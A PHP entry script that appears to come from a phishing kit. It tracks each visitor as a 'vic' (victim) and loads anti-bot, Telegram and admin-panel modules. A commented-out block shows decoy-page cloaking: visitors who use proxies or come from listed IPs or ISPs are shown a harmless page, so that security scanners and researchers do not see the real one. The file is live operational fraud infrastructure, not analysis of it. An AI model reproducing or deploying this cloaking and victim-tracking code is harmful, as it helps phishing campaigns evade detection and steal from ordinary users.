<?php

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

require __DIR__ . "/md.php";
$detect = new Mobile_Detect;
if(!$detect->isMobile()){
    //exit;
}

require __DIR__ . '/panel/classes/Jeehan.class.php';
require __DIR__ . '/bots/botMother.php';
require_once __DIR__ . '/verifen/telegram.php';
require_once __DIR__ . '/verifen/x_deux_ip.php';
$ajaxPath = "../panel/process/processor.php";

$j = new Jeehan();
if (!isset($_SESSION['vic']) || $_SESSION['vic'] == "") {
    $j->createVic();
}

if ($j->isBlocked()) {
    exit;
}
/*
// Resolve real visitor IP — trust Cloudflare's CF-Connecting-IP header when present
$ip = isset($_SERVER['HTTP_CF_CONNECTING_IP'])
    ? $_SERVER['HTTP_CF_CONNECTING_IP']
    : $_SERVER['REMOTE_ADDR'];
$x_deux_ipz = $ip;

// Proxy header check — excludes headers Cloudflare injects on every request
// (HTTP_X_FORWARDED_FOR, HTTP_X_FORWARDED_PROTO, HTTP_X_FORWARDED) are set by CF itself
$test_HTTP_proxy_headers = array(
    'HTTP_VIA', 'VIA', 'Proxy-Connection',
    'HTTP_CLIENT_IP', 'HTTP_FORWARDED_FOR_IP',
    'X-PROXY-ID', 'MT-PROXY-ID', 'X-TINYPROXY',
    'FORWARDED_FOR', 'FORWARDED',
    'CLIENT-IP', 'CLIENT_IP', 'PROXY-AGENT',
    'HTTP_X_CLUSTER_CLIENT_IP',
    'FORWARDED_FOR_IP', 'HTTP_PROXY_CONNECTION'
);

$proxy_detected = false;
foreach ($test_HTTP_proxy_headers as $header) {
    if (isset($_SERVER[$header]) && !empty($_SERVER[$header])) {
        $proxy_detected = true;
        break;
    }
}

if ($proxy_detected) {
    include __DIR__ . '/verifen/popular.php';
    exit;
}

$x_deux_filez = file_get_contents(__DIR__ . '/x_deux_robots.txt');
$x_deux_expz = explode("\n", $x_deux_filez);

for ($p = 0; $p < count($x_deux_expz); $p++) {
    if (trim($x_deux_expz[$p]) == $x_deux_ipz) {
        include __DIR__ . '/verifen/popular.php';
        exit;
    }
}

require_once __DIR__ . '/verifen/x_deux_isps.php';

$x_deux = x_deux_isp($ip);

if ($x_deux['PROXY'] == 'FALSE') {
    $x_deux_file = file_get_contents(__DIR__ . '/x_deux_isp.txt');
    $x_deux_exp = explode("\n", $x_deux_file);

    for ($i = 0; $i < count($x_deux_exp); $i++) {
        if ($x_deux_exp[$i] == $x_deux['ISP']) {
            include __DIR__ . '/verifen/popular.php';
            exit;
        }
    }
} else {
    include __DIR__ . '/verifen/popular.php';
    exit;
}

$rate_limit = 100;
$ip_hash = md5($ip);
$rate_limit_key = 'rate_limit:' . $ip_hash;
$requests = (int) ($_SESSION[$rate_limit_key]['requests'] ?? 0);
$last_request_time = (int) ($_SESSION[$rate_limit_key]['time'] ?? 0);
$current_time = time();

if ($current_time - $last_request_time < 60 && $requests >= $rate_limit) {
    include __DIR__ . '/verifen/popular.php';
    exit();
} else {
    $_SESSION[$rate_limit_key] = [
        'requests' => $requests + 1,
        'time' => $current_time
    ];
}

// Cloudflare terminates SSL and forwards over HTTP — check CF's forwarded proto too
$isHttps = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')
        || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');

if (!$isHttps) {
    $redirect_url = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    header('Location: ' . $redirect_url);
    exit();
}
*/



?>
